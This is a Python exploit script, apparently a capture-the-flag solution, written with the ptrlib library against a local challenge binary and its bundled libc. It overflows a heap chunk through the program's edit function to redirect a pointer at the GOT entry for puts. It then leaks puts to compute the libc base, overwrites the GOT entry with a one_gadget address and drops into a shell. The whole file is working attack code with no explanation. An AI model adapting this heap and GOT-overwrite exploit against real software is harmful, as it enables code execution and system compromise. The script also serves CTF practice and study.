#!/usr/bin/env python

import ptrlib as ptr


def unwrap(x):
    if x is None:
        ptr.logger.error("failed to unwrap")
        exit(1)
    else:
        return x


elf = ptr.ELF("./chall_patched")
libc = ptr.ELF("./libc.so.6")
io = ptr.Process(elf.filepath)

one_gadgets = [0xDE78C, 0xDE78F, 0xDE792]


def create(data):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Content: ", data)


def edit(idx, data):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"New content: ", data)


create(b"AAAA")
create(b"BBBB")

payload = b"A" * 0x20
payload += ptr.p64(0x31)
payload += ptr.p64(unwrap(elf.got("puts")) - 0x8)
edit(0, payload)

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"index: ", b"2")
libc.base = ptr.u64(io.recvlineafter(b"Old content: ").strip())  - unwrap(libc.symbol("puts"))
# - 0x5A9D0
io.sendlineafter(b"New content: ", ptr.p64(libc.base + one_gadgets[1]))

io.sh()
